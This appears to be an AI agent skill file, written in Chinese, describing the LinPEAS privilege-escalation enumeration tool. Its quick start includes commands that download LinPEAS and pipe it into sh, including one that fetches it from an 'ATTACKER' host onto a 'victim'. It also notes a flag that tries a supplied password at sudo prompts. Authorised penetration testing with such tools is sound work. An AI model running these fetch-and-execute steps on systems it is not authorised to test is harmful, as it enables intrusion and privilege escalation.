---
name: linpeas
description: >
  此技能适用于用户询问关于 "linpeas"、"以低权限用户身份在 Linux 或 macOS 上识别提权路径"、
  "自动化枚举 Linux/macOS 提权向量" 的问题。
---

# LinPEAS

Linux/macOS 提权枚举 (Privilege Escalation Enumeration) 脚本。

## 快速开始

```bash
# 直接下载并运行（目标主机有网络）
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 从攻击机托管并传送到目标
python3 -m http.server 8000   # attacker
curl http://ATTACKER:8000/linpeas.sh | sh   # victim

# 保存输出以供审查
./linpeas.sh -a 2>&1 | tee linpeas.out
```

## 关键参数

| 参数 | 用途 |
|------|---------|
| `-a` | 全部检查（彻底模式） |
| `-q` | 静默模式 |
| `-s` | 超快模式 — 跳过耗时检查 |
| `-P <pass>` | 尝试对 sudo 提示使用指定密码 |

## 发现类别

| 分类 | 检测内容 |
|---------|--------------|
| 系统信息 | 操作系统/内核版本、CVE 指示器 |
| 用户与组 | sudo 权限、passwd/shadow 泄露 |
| 文件 | SUID 二进制文件、全局可写的 root 目录 |
| 计划任务 | 全局可写的 cron 脚本 |
| 网络 | 开放的本地端口、hosts 文件 |
| 服务 | 服务二进制文件的弱权限 |

## 输出解读

- **红色 / 黄色高亮** = 高置信度提权向量
- 优先检查所有标注 `99% PE —` 的行

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 常见发现的手动利用方法 |
